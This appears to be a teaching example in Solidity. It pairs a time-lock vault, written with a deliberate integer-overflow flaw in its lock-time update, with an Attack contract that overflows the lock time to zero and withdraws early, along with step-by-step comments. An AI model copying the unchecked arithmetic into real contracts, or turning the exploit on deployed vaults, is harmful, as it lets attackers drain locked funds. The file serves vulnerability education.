pragma solidity ^0.7.6;

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for at least a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;    
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender]>0,"Insufficient funds");
        require(block.timestamp > lockTime[msg.sender],"Lock time not expired");

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool success ,) = msg.sender.call{value:amount}("");
        require(success,"Failed to send Ether");
    }
}


contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = _timeLock;
    }

    fallback() external payable{}

    function attack() public payable{
        timeLock.deposit{value:msg.value}();

        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */

        timeLock.increaseLockTime(
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );

        timeLock.withdraw();
    }
}